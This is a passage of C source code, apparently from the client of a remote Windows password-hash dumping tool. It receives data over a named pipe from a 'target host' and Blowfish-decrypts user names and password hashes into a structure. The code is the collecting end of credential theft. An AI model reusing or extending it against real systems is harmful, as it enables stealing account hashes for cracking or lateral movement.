					// This is hash data from the target
					// Hash data will be 64 encrypted bytes followed by the user's name
					// Store in an appropriate structure
					USERINFO* pTemp;

					BYTE cUserBlocks = chBuf[2];

					if (lpUserInfoArray == NULL)
					{
						lpUserInfoArray = (USERINFO*)GlobalAlloc(GMEM_FIXED, sizeof(USERINFO));
						nUserInfoArraySize = 1;
						pTemp = lpUserInfoArray;
					}
					else
					{
						lpUserInfoArray = (USERINFO*)GlobalReAlloc((HGLOBAL)lpUserInfoArray, (nUserInfoArraySize + 1) * sizeof(USERINFO), GMEM_MOVEABLE);
						int n = sizeof(USERINFO);
						pTemp = lpUserInfoArray + nUserInfoArraySize; // (nUserInfoArraySize * sizeof(USERINFO));
						++nUserInfoArraySize;
					}
					
					// Copy data to the structure
					for (i = 0; i < 64; i++)
					{
						pTemp->cHash[i] = chBuf[i + 3];
					}

					// Decrypt user and hash data
					/*char temp[400];
					memset(temp, 0, 400);
					memcpy(temp, &(chBuf[3]), 30);
					printf("Message size: %d, raw data: %s\n",cUserBlocks, temp);*/

					// User data
					for (i = 0; i <= cUserBlocks; i++)
					{
						ConvertToBlowfishLongs(chBuf + (i * 8) + 67, &dwDataChunk1, &dwDataChunk2); 
						Blowfish_Decrypt(&ctx, &dwDataChunk1, &dwDataChunk2);

						// Unicode pointer math - only increment by 1/2
						memcpy(&(pTemp->wszUser[(i * 4)]), &dwDataChunk1, 4);
						memcpy(&(pTemp->wszUser[(i * 4) + 2]), &dwDataChunk2, 4);
					}

					// Hash data
					for (i = 0; i < 4; i++)
					{
						ConvertToBlowfishLongs(chBuf + (i * 8) + 3, &dwDataChunk1, &dwDataChunk2); 
						Blowfish_Decrypt(&ctx, &dwDataChunk1, &dwDataChunk2);
						
						memcpy(pTemp->cHash + (i * 8), &dwDataChunk1, 4);
						memcpy(pTemp->cHash + (i * 8) + 4, &dwDataChunk2, 4);
					}
				}
				else if (chBuf[0] == 3)
				{
					// Status message - just print it out
					printf("%ls\n", chBuf + 67/*267*/); 						
				}
				else
				{
					// Unknown message
					printf("Invalid message received from target host: %d\n", chBuf[0]);
				}
			}
			else
				printf("Invalid data received (length was %d)\n", cbRead);

			// Purge data from the pipe
			CloseHandle(hFile);
			hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			while(GetLastError() == ERROR_PIPE_BUSY)
			{ 
				Sleep(100);
				if (!WaitNamedPipe(szPipeName, 20000))
				{
					printf("Timed out waiting to get our pipe back\n");
					return;
				}

				hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	
			}

			if(hFile == INVALID_HANDLE_VALUE)
			{ 
				printf("CreateFile failed to create a new client-side pipe: error %d\n", GetLastError());
				return;
			} 
		}
	} while (1);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);


	return;
}
